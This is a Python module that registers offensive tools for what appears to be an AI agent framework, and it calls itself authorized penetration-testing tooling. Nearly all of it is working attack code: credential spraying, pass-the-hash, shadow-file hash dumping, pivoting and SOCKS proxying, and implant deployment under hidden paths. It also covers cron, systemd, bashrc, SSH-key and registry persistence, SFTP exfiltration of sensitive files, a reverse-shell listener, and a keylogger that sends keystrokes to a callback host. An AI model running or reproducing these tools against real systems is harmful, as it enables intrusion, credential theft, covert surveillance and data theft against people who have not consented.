"""Lateral movement, credential operations, pivoting, and persistence tools.

Provides credential spraying, pass-the-hash, hash dumping, pivoting,
SOCKS proxying, implant deployment, persistence, data exfiltration,
C2 listeners, and keylogger deployment for authorized penetration testing.
"""

from __future__ import annotations

import json
import logging
import os
import socket
import socketserver
import subprocess
import sys
import textwrap
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List

from nous.tools.registry import ToolContext, ToolEntry

log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Dependency helpers
# ---------------------------------------------------------------------------

def _ensure_paramiko():
    try:
        import paramiko
        return paramiko
    except ImportError:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "-q", "paramiko"],
            capture_output=True, timeout=120,
        )
        import paramiko
        return paramiko


def _ensure_impacket():
    try:
        import impacket
        return impacket
    except ImportError:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "-q", "impacket"],
            capture_output=True, timeout=120,
        )
        import impacket
        return impacket


def _ssh_connect(host: str, port: int, username: str,
                 password: str = "", key_path: str = "",
                 timeout: int = 10):
    """Create and return a connected paramiko SSHClient."""
    paramiko = _ensure_paramiko()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    kwargs: Dict[str, Any] = {
        "hostname": host, "port": int(port),
        "username": username, "timeout": timeout,
    }
    if key_path and os.path.isfile(key_path):
        kwargs["key_filename"] = key_path
    elif password:
        kwargs["password"] = password
    else:
        kwargs["allow_agent"] = True
        kwargs["look_for_keys"] = True

    client.connect(**kwargs)
    return client


def _ssh_exec_cmd(host: str, port: int, username: str, password: str,
                  command: str, key_path: str = "",
                  timeout: int = 15) -> Dict[str, Any]:
    """Execute a command over SSH and return result dict."""
    try:
        client = _ssh_connect(host, port, username, password,
                              key_path, timeout=timeout)
        _, stdout, stderr = client.exec_command(command, timeout=timeout)
        out = stdout.read().decode("utf-8", errors="replace")
        err = stderr.read().decode("utf-8", errors="replace")
        code = stdout.channel.recv_exit_status()
        client.close()
        return {"exit_code": code, "stdout": out[:10000],
                "stderr": err[:5000]}
    except Exception as e:
        return {"error": str(e)}


# ---------------------------------------------------------------------------
# Credential operations
# ---------------------------------------------------------------------------

def _credential_spray(ctx: ToolContext, targets: str, username: str,
                      password: str, protocol: str = "ssh",
                      port: int = 0, threads: int = 10,
                      timeout: int = 5) -> str:
    """Test username/password combo across multiple hosts.

    targets: comma-separated IPs or CIDR.
    protocol: 'ssh', 'smb', or 'http_basic'.
    port: override port (0 = default for protocol).
    """
    import ipaddress as _ipa

    threads = min(int(threads), 50)
    timeout = min(int(timeout), 15)

    # Parse targets
    host_list = []
    for t in targets.split(","):
        t = t.strip()
        try:
            net = _ipa.ip_network(t, strict=False)
            host_list.extend(str(ip) for ip in net.hosts())
        except ValueError:
            host_list.append(t)
    host_list = host_list[:1024]

    default_ports = {"ssh": 22, "smb": 445, "http_basic": 80}
    use_port = int(port) if int(port) > 0 else default_ports.get(protocol, 22)

    results = []

    def _try_host(h: str) -> Dict[str, Any]:
        try:
            if protocol == "ssh":
                paramiko = _ensure_paramiko()
                c = paramiko.SSHClient()
                c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                c.connect(h, use_port, username, password, timeout=timeout)
                c.close()
                return {"host": h, "status": "success", "protocol": "ssh"}
            elif protocol == "smb":
                _ensure_impacket()
                from impacket.smbconnection import SMBConnection
                conn = SMBConnection(h, h, sess_port=use_port)
                conn.login(username, password)
                conn.close()
                return {"host": h, "status": "success", "protocol": "smb"}
            elif protocol == "http_basic":
                import urllib.request
                import base64
                creds = base64.b64encode(
                    f"{username}:{password}".encode()).decode()
                req = urllib.request.Request(
                    f"http://{h}:{use_port}/",
                    headers={"Authorization": f"Basic {creds}"},
                )
                urllib.request.urlopen(req, timeout=timeout)
                return {"host": h, "status": "success",
                        "protocol": "http_basic"}
        except Exception as e:
            return {"host": h, "status": "failed", "reason": str(e)[:200]}

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futs = {pool.submit(_try_host, h): h for h in host_list}
        for f in as_completed(futs):
            results.append(f.result())

    successes = [r for r in results if r.get("status") == "success"]
    return json.dumps({
        "protocol": protocol, "port": use_port,
        "total_tested": len(host_list),
        "success_count": len(successes),
        "successes": successes,
        "failures": [r for r in results if r.get("status") == "failed"][:20],
    }, ensure_ascii=False, indent=2)


def _pass_the_hash(ctx: ToolContext, host: str, username: str,
                   ntlm_hash: str, command: str = "whoami",
                   domain: str = "") -> str:
    """Authenticate using NTLM hash (no password needed) via impacket.

    ntlm_hash: 'LM:NT' format hash (e.g. 'aad3b435...:31d6cfe0...').
    command: command to execute on target.
    """
    try:
        _ensure_impacket()
        from impacket.smbconnection import SMBConnection

        conn = SMBConnection(host, host)
        lm, nt = ntlm_hash.split(":")
        conn.login(username, "", domain if domain else ".",
                   lmhash=lm, nthash=nt)

        # Execute command via SMBEXEC
        from impacket.examples.smbexec import SMBEXEC
        executer = SMBEXEC(
            command, None, None,
            domain if domain else ".",
            username, "",
            ntlm_hash, None, None,
        )
        executer.run(host, host)

        conn.close()
        return json.dumps({
            "host": host, "username": username,
            "method": "pass_the_hash",
            "command": command,
            "status": "executed",
        }, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e), "host": host})


def _dump_hashes(ctx: ToolContext, host: str, username: str,
                 password: str = "", key_path: str = "",
                 port: int = 22, target_os: str = "linux") -> str:
    """Extract password hashes from a compromised host via SSH.

    target_os: 'linux' (reads /etc/shadow) or 'windows' (uses hashdump).
    """
    try:
        if target_os == "linux":
            cmds = [
                "cat /etc/shadow 2>/dev/null || echo 'DENIED'",
                "cat /etc/passwd",
                "getent passwd 2>/dev/null",
            ]
            results = {}
            for cmd in cmds:
                r = _ssh_exec_cmd(host, int(port), username, password,
                                  cmd, key_path, timeout=10)
                results[cmd.split()[1] if len(cmd.split()) > 1 else cmd[:20]] = r

            return json.dumps({
                "host": host, "os": "linux",
                "results": results,
            }, ensure_ascii=False, indent=2)

        elif target_os == "windows":
            # Use impacket secretsdump remotely
            try:
                _ensure_impacket()
                from impacket.examples.secretsdump import RemoteOperations
                from impacket.smbconnection import SMBConnection

                conn = SMBConnection(host, host)
                conn.login(username, password)
                remote = RemoteOperations(conn, False)
                remote.enableRegistry()
                bootkey = remote.getBootKey()

                return json.dumps({
                    "host": host, "os": "windows",
                    "method": "secretsdump",
                    "bootkey_obtained": bool(bootkey),
                    "status": "check impacket output",
                }, ensure_ascii=False, indent=2)
            except Exception as e:
                return json.dumps({"error": f"secretsdump failed: {e}",
                                   "host": host})
        else:
            return json.dumps({"error": f"Unknown OS: {target_os}"})
    except Exception as e:
        return json.dumps({"error": str(e), "host": host})


# ---------------------------------------------------------------------------
# Pivoting & tunneling
# ---------------------------------------------------------------------------

def _pivot_scan(ctx: ToolContext, pivot_host: str, pivot_user: str,
                target: str, ports: str = "22,80,443,445,3389,8080",
                pivot_password: str = "", pivot_key: str = "",
                pivot_port: int = 22, timeout: int = 3) -> str:
    """Port scan through a compromised host (proxy-style pivoting).

    pivot_host: compromised host to scan from.
    target: final target IP or subnet to scan.
    ports: comma-separated ports to check.
    """
    port_list = [int(p.strip()) for p in ports.split(",") if p.strip()]
    timeout = min(int(timeout), 10)

    # SSH into pivot and run scan from there
    scan_script = f"""
import socket
target = "{target}"
ports = {port_list}
open_ports = []
for p in ports:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout({timeout})
        if s.connect_ex((target, p)) == 0:
            open_ports.append(p)
        s.close()
    except Exception:
        pass
print(",".join(str(p) for p in open_ports))
"""
    cmd = f"python3 -c {repr(scan_script)}"
    r = _ssh_exec_cmd(pivot_host, int(pivot_port), pivot_user,
                      pivot_password, cmd, pivot_key, timeout=60)

    if "error" in r:
        return json.dumps({
            "error": r["error"],
            "pivot_host": pivot_host, "target": target,
        }, ensure_ascii=False, indent=2)

    open_str = r.get("stdout", "").strip()
    open_ports = [int(p) for p in open_str.split(",") if p.strip()]

    return json.dumps({
        "pivot_host": pivot_host,
        "target": target,
        "ports_scanned": port_list,
        "open_ports": open_ports,
    }, ensure_ascii=False, indent=2)


def _socks_proxy(ctx: ToolContext, host: str, username: str,
                 local_port: int = 1080, password: str = "",
                 key_path: str = "", port: int = 22,
                 duration: int = 600) -> str:
    """Set up a SOCKS4/5 proxy through an SSH dynamic port forward.

    local_port: local SOCKS bind port (default 1080).
    duration: proxy lifetime in seconds (default 600).
    """
    try:
        paramiko = _ensure_paramiko()
        client = _ssh_connect(host, int(port), username, password,
                              key_path, timeout=10)
        transport = client.get_transport()

        local_port = int(local_port)
        duration = min(int(duration), 3600)

        # Dynamic port forward
        transport.request_port_forward("", local_port)

        def _keepalive():
            time.sleep(duration)
            try:
                client.close()
            except Exception:
                pass

        t = threading.Thread(target=_keepalive, daemon=True)
        t.start()

        return json.dumps({
            "host": host,
            "socks_bind": f"127.0.0.1:{local_port}",
            "duration_sec": duration,
            "status": "active",
            "usage": (
                f"export ALL_PROXY=socks5://127.0.0.1:{local_port} "
                f"or use proxychains with socks5 127.0.0.1 {local_port}"
            ),
        }, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e), "host": host})


# ---------------------------------------------------------------------------
# Implant & persistence
# ---------------------------------------------------------------------------

def _deploy_implant(ctx: ToolContext, host: str, username: str,
                    payload_path: str = "", payload_code: str = "",
                    remote_path: str = "/tmp/.svc",
                    password: str = "", key_path: str = "",
                    port: int = 22, background: str = "true") -> str:
    """Upload and execute an agent/payload on a remote host via SSH.

    payload_path: local file to upload and execute.
    payload_code: inline Python code to deploy (if no payload_path).
    remote_path: where to place the payload on target.
    background: 'true' to run as background process.
    """
    try:
        client = _ssh_connect(host, int(port), username, password, key_path)
        sftp = client.open_sftp()

        if payload_path and os.path.isfile(payload_path):
            sftp.put(payload_path, remote_path)
        elif payload_code:
            with sftp.open(remote_path, "w") as f:
                f.write(payload_code)
        else:
            client.close()
            return json.dumps({"error": "Provide payload_path or payload_code"})

        sftp.chmod(remote_path, 0o755)
        sftp.close()

        # Execute
        if background.lower() == "true":
            cmd = f"nohup {remote_path} > /dev/null 2>&1 &"
        else:
            cmd = remote_path

        _, stdout, stderr = client.exec_command(cmd, timeout=15)
        out = stdout.read().decode("utf-8", errors="replace")
        err = stderr.read().decode("utf-8", errors="replace")
        client.close()

        return json.dumps({
            "host": host, "remote_path": remote_path,
            "background": background.lower() == "true",
            "stdout": out[:5000], "stderr": err[:2000],
            "status": "deployed",
        }, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e), "host": host})


def _install_persistence(ctx: ToolContext, host: str, username: str,
                         method: str = "crontab",
                         command: str = "",
                         password: str = "", key_path: str = "",
                         port: int = 22) -> str:
    """Install persistence mechanism on target host via SSH.

    method: 'crontab', 'systemd', 'bashrc', 'ssh_key', or 'registry' (Windows).
    command: the command/payload to persist.
    """
    if not command and method != "ssh_key":
        return json.dumps({"error": "Provide a command to persist"})

    try:
        persistence_cmds = {
            "crontab": (
                f'(crontab -l 2>/dev/null; echo "* * * * * {command}") '
                f'| crontab -'
            ),
            "systemd": (
                f'cat > /etc/systemd/system/.svc.service << EOSVC\n'
                f'[Unit]\nDescription=System Service\n'
                f'[Service]\nExecStart={command}\nRestart=always\n'
                f'RestartSec=60\n[Install]\n'
                f'WantedBy=multi-user.target\nEOSVC\n'
                f'systemctl daemon-reload && systemctl enable .svc && '
                f'systemctl start .svc'
            ),
            "bashrc": (
                f'echo "{command} &" >> ~/.bashrc && '
                f'echo "{command} &" >> ~/.profile'
            ),
            "ssh_key": (
                'mkdir -p ~/.ssh && chmod 700 ~/.ssh && '
                'cat >> ~/.ssh/authorized_keys << EOKEY\n'
                f'{command}\nEOKEY\n'
                'chmod 600 ~/.ssh/authorized_keys'
            ),
            "registry": (
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion'
                f'\\Run /v SysUpdate /t REG_SZ /d "{command}" /f'
            ),
        }

        if method not in persistence_cmds:
            return json.dumps({
                "error": f"Unknown method: {method}",
                "available": list(persistence_cmds.keys()),
            })

        cmd = persistence_cmds[method]
        r = _ssh_exec_cmd(host, int(port), username, password, cmd,
                          key_path, timeout=15)

        return json.dumps({
            "host": host, "method": method,
            "result": r,
            "status": "installed" if r.get("exit_code", 1) == 0 else "check_output",
        }, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e), "host": host})


# ---------------------------------------------------------------------------
# Data exfiltration
# ---------------------------------------------------------------------------

def _exfil_data(ctx: ToolContext, host: str, username: str,
                remote_paths: str,
                local_dest: str = "/tmp/exfil",
                password: str = "", key_path: str = "",
                port: int = 22) -> str:
    """Collect and download sensitive files from a target host via SFTP.

    remote_paths: comma-separated files/dirs to exfiltrate.
    local_dest: local directory to store downloaded files.
    """
    try:
        os.makedirs(local_dest, exist_ok=True)
        client = _ssh_connect(host, int(port), username, password, key_path)
        sftp = client.open_sftp()

        paths = [p.strip() for p in remote_paths.split(",") if p.strip()]
        downloaded = []
        errors = []

        for rpath in paths:
            try:
                # Check if directory
                try:
                    sftp.listdir(rpath)
                    is_dir = True
                except IOError:
                    is_dir = False

                if is_dir:
                    # Recursive directory download
                    dir_name = os.path.basename(rpath.rstrip("/"))
                    local_dir = os.path.join(local_dest, dir_name)
                    os.makedirs(local_dir, exist_ok=True)

                    def _dl_recursive(remote_dir, local_dir, depth=0):
                        if depth > 5:
                            return
                        for item in sftp.listdir_attr(remote_dir):
                            rp = remote_dir + "/" + item.filename
                            lp = os.path.join(local_dir, item.filename)
                            if item.st_mode and (item.st_mode & 0o40000):
                                os.makedirs(lp, exist_ok=True)
                                _dl_recursive(rp, lp, depth + 1)
                            else:
                                sftp.get(rp, lp)
                                downloaded.append({
                                    "remote": rp, "local": lp,
                                    "size": item.st_size,
                                })

                    _dl_recursive(rpath, local_dir)
                else:
                    fname = os.path.basename(rpath)
                    local_file = os.path.join(local_dest, fname)
                    sftp.get(rpath, local_file)
                    stat = sftp.stat(rpath)
                    downloaded.append({
                        "remote": rpath, "local": local_file,
                        "size": stat.st_size,
                    })
            except Exception as e:
                errors.append({"path": rpath, "error": str(e)})

        sftp.close()
        client.close()

        total_size = sum(d.get("size", 0) for d in downloaded)
        return json.dumps({
            "host": host,
            "files_downloaded": len(downloaded),
            "total_bytes": total_size,
            "local_dest": local_dest,
            "files": downloaded[:100],
            "errors": errors,
        }, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e), "host": host})


# ---------------------------------------------------------------------------
# C2 & keylogger
# ---------------------------------------------------------------------------

def _c2_listener(ctx: ToolContext, port: int = 4444,
                 bind_addr: str = "0.0.0.0",
                 timeout: int = 300) -> str:
    """Start a simple reverse shell listener on specified port.

    port: listen port (default 4444).
    bind_addr: bind address (default 0.0.0.0).
    timeout: listener timeout in seconds.
    """
    port = int(port)
    timeout = min(int(timeout), 3600)

    result = {"bind": f"{bind_addr}:{port}", "status": "listening"}

    def _listen():
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((bind_addr, port))
            srv.listen(1)
            srv.settimeout(timeout)
            log.info("C2 listener on %s:%d", bind_addr, port)

            conn, addr = srv.accept()
            result["connected_from"] = f"{addr[0]}:{addr[1]}"
            result["status"] = "connected"
            log.info("C2 connection from %s:%d", addr[0], addr[1])

            # Read initial output
            conn.settimeout(5)
            try:
                banner = conn.recv(4096).decode("utf-8", errors="replace")
                result["banner"] = banner[:2000]
            except socket.timeout:
                pass

            conn.close()
            srv.close()
        except socket.timeout:
            result["status"] = "timeout"
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)

    t = threading.Thread(target=_listen, daemon=True)
    t.start()
    # Give it a moment to start
    time.sleep(0.5)

    return json.dumps(result, ensure_ascii=False, indent=2)


def _keylog_deploy(ctx: ToolContext, host: str, username: str,
                   callback_host: str = "", callback_port: int = 4445,
                   duration: int = 300, password: str = "",
                   key_path: str = "", port: int = 22) -> str:
    """Deploy a Python keylogger to target host via SSH.

    callback_host: IP to send captured keys to (empty = log to file).
    callback_port: port on callback host.
    duration: capture duration in seconds.
    """
    duration = min(int(duration), 3600)

    if callback_host:
        exfil = f"""
import socket
def send(data):
    try:
        s = socket.socket()
        s.connect(("{callback_host}", {int(callback_port)}))
        s.send(data.encode())
        s.close()
    except: pass
"""
    else:
        exfil = """
def send(data):
    with open("/tmp/.keys.log", "a") as f:
        f.write(data)
"""

    keylog_script = textwrap.dedent(f"""\
#!/usr/bin/env python3
import subprocess, time, threading
{exfil}
buf = []
def flush():
    while True:
        time.sleep(10)
        if buf:
            send("".join(buf))
            buf.clear()
t = threading.Thread(target=flush, daemon=True)
t.start()
try:
    proc = subprocess.Popen(
        ["script", "-q", "/dev/null"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    start = time.time()
    while time.time() - start < {duration}:
        data = proc.stdout.read(1)
        if data:
            buf.append(data.decode("utf-8", errors="replace"))
except: pass
finally:
    if buf:
        send("".join(buf))
""")

    try:
        client = _ssh_connect(host, int(port), username, password, key_path)
        sftp = client.open_sftp()
        remote_path = "/tmp/.xsession"
        with sftp.open(remote_path, "w") as f:
            f.write(keylog_script)
        sftp.chmod(remote_path, 0o755)
        sftp.close()

        cmd = f"nohup python3 {remote_path} > /dev/null 2>&1 &"
        _, stdout, stderr = client.exec_command(cmd, timeout=5)
        time.sleep(1)
        client.close()

        return json.dumps({
            "host": host,
            "remote_path": remote_path,
            "callback": f"{callback_host}:{callback_port}" if callback_host else "local_file:/tmp/.keys.log",
            "duration_sec": duration,
            "status": "deployed",
        }, ensure_ascii=False, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e), "host": host})


# ---------------------------------------------------------------------------
# Tool registration
# ---------------------------------------------------------------------------

def get_tools(ctx: ToolContext) -> List[ToolEntry]:
    return [
        ToolEntry("credential_spray", {
            "name": "credential_spray",
            "description": "Test username/password combo across multiple hosts (SSH/SMB/HTTP).",
            "parameters": {"type": "object", "properties": {
                "targets": {"type": "string",
                            "description": "Comma-separated IPs or CIDR"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "protocol": {"type": "string", "default": "ssh",
                             "description": "'ssh', 'smb', or 'http_basic'"},
                "port": {"type": "integer", "default": 0},
                "threads": {"type": "integer", "default": 10},
                "timeout": {"type": "integer", "default": 5},
            }, "required": ["targets", "username", "password"]},
        }, _credential_spray),

        ToolEntry("pass_the_hash", {
            "name": "pass_the_hash",
            "description": "Authenticate using NTLM hash (no password) via impacket.",
            "parameters": {"type": "object", "properties": {
                "host": {"type": "string"},
                "username": {"type": "string"},
                "ntlm_hash": {"type": "string",
                              "description": "'LM:NT' format hash"},
                "command": {"type": "string", "default": "whoami"},
                "domain": {"type": "string", "default": ""},
            }, "required": ["host", "username", "ntlm_hash"]},
        }, _pass_the_hash),

        ToolEntry("dump_hashes", {
            "name": "dump_hashes",
            "description": "Extract password hashes from compromised Linux/Windows host.",
            "parameters": {"type": "object", "properties": {
                "host": {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string", "default": ""},
                "key_path": {"type": "string", "default": ""},
                "port": {"type": "integer", "default": 22},
                "target_os": {"type": "string", "default": "linux",
                              "description": "'linux' or 'windows'"},
            }, "required": ["host", "username"]},
        }, _dump_hashes),

        ToolEntry("pivot_scan", {
            "name": "pivot_scan",
            "description": "Port scan through a compromised pivot host.",
            "parameters": {"type": "object", "properties": {
                "pivot_host": {"type": "string"},
                "pivot_user": {"type": "string"},
                "target": {"type": "string",
                           "description": "Final target IP to scan"},
                "ports": {"type": "string",
                          "default": "22,80,443,445,3389,8080"},
                "pivot_password": {"type": "string", "default": ""},
                "pivot_key": {"type": "string", "default": ""},
                "pivot_port": {"type": "integer", "default": 22},
                "timeout": {"type": "integer", "default": 3},
            }, "required": ["pivot_host", "pivot_user", "target"]},
        }, _pivot_scan),

        ToolEntry("socks_proxy", {
            "name": "socks_proxy",
            "description": "Set up SOCKS proxy through SSH dynamic port forward.",
            "parameters": {"type": "object", "properties": {
                "host": {"type": "string"},
                "username": {"type": "string"},
                "local_port": {"type": "integer", "default": 1080},
                "password": {"type": "string", "default": ""},
                "key_path": {"type": "string", "default": ""},
                "port": {"type": "integer", "default": 22},
                "duration": {"type": "integer", "default": 600},
            }, "required": ["host", "username"]},
        }, _socks_proxy),

        ToolEntry("deploy_implant", {
            "name": "deploy_implant",
            "description": "Upload and execute agent/payload on remote host via SSH.",
            "parameters": {"type": "object", "properties": {
                "host": {"type": "string"},
                "username": {"type": "string"},
                "payload_path": {"type": "string", "default": ""},
                "payload_code": {"type": "string", "default": ""},
                "remote_path": {"type": "string", "default": "/tmp/.svc"},
                "password": {"type": "string", "default": ""},
                "key_path": {"type": "string", "default": ""},
                "port": {"type": "integer", "default": 22},
                "background": {"type": "string", "default": "true"},
            }, "required": ["host", "username"]},
        }, _deploy_implant),

        ToolEntry("install_persistence", {
            "name": "install_persistence",
            "description": "Install persistence (crontab/systemd/bashrc/ssh_key/registry) on target.",
            "parameters": {"type": "object", "properties": {
                "host": {"type": "string"},
                "username": {"type": "string"},
                "method": {"type": "string", "default": "crontab",
                           "description": "'crontab','systemd','bashrc','ssh_key','registry'"},
                "command": {"type": "string", "default": ""},
                "password": {"type": "string", "default": ""},
                "key_path": {"type": "string", "default": ""},
                "port": {"type": "integer", "default": 22},
            }, "required": ["host", "username"]},
        }, _install_persistence),

        ToolEntry("exfil_data", {
            "name": "exfil_data",
            "description": "Collect and download sensitive files from target via SFTP.",
            "parameters": {"type": "object", "properties": {
                "host": {"type": "string"},
                "username": {"type": "string"},
                "remote_paths": {"type": "string",
                                 "description": "Comma-separated files/dirs"},
                "local_dest": {"type": "string", "default": "/tmp/exfil"},
                "password": {"type": "string", "default": ""},
                "key_path": {"type": "string", "default": ""},
                "port": {"type": "integer", "default": 22},
            }, "required": ["host", "username", "remote_paths"]},
        }, _exfil_data),

        ToolEntry("c2_listener", {
            "name": "c2_listener",
            "description": "Start a reverse shell listener on specified port.",
            "parameters": {"type": "object", "properties": {
                "port": {"type": "integer", "default": 4444},
                "bind_addr": {"type": "string", "default": "0.0.0.0"},
                "timeout": {"type": "integer", "default": 300},
            }},
        }, _c2_listener),

        ToolEntry("keylog_deploy", {
            "name": "keylog_deploy",
            "description": "Deploy Python keylogger to target host via SSH.",
            "parameters": {"type": "object", "properties": {
                "host": {"type": "string"},
                "username": {"type": "string"},
                "callback_host": {"type": "string", "default": ""},
                "callback_port": {"type": "integer", "default": 4445},
                "duration": {"type": "integer", "default": 300},
                "password": {"type": "string", "default": ""},
                "key_path": {"type": "string", "default": ""},
                "port": {"type": "integer", "default": 22},
            }, "required": ["host", "username"]},
        }, _keylog_deploy),
    ]
